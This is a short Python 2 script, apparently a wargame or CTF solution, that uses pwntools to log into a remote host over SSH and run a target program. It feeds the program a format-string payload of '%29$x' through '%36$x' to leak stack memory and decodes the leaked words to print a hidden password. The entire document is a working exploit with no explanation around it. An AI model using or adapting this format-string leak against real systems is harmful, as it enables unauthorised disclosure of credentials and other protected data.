#!/usr/bin/python
import sys
from pwn import *

USERNAME=""
PASSWORD=""
HOST=""
FILE=""

def connect_remote(username, password, host):
    try:
        s = ssh(host=host, user=username, password=password)
    except:
        print "[!] Couldn't connect on remote host (\"%s\")" % (host)
        sys.exit(1)
    if not s.connected():
        print "[!] Couldn't connect on remote host (\"%s\")" % (host)
        sys.exit(1)
    return s

def decode(value):
    result = ""
    for i in range(0, len(value), 8):
        result += value[i:i+8].decode("hex")[::-1]
    return result.replace("\x00","")

if __name__ == "__main__":
    p = connect_remote(USERNAME,PASSWORD,HOST)
    sh = p.run("sh")
    print "PID: %d" % (p.pid)

    step = 29
    payload = ""
    password = ""
    for i in range(step, step+8):
        payload += "%" + str(i) + "$x"

    sh.sendline(FILE)
    sh.sendline(payload + "\n")
    for e in sh.recvuntil("does not have access!").split("\n"):
        if "access!" in e:
            print decode(e.split(" ")[0])
    sh.close()
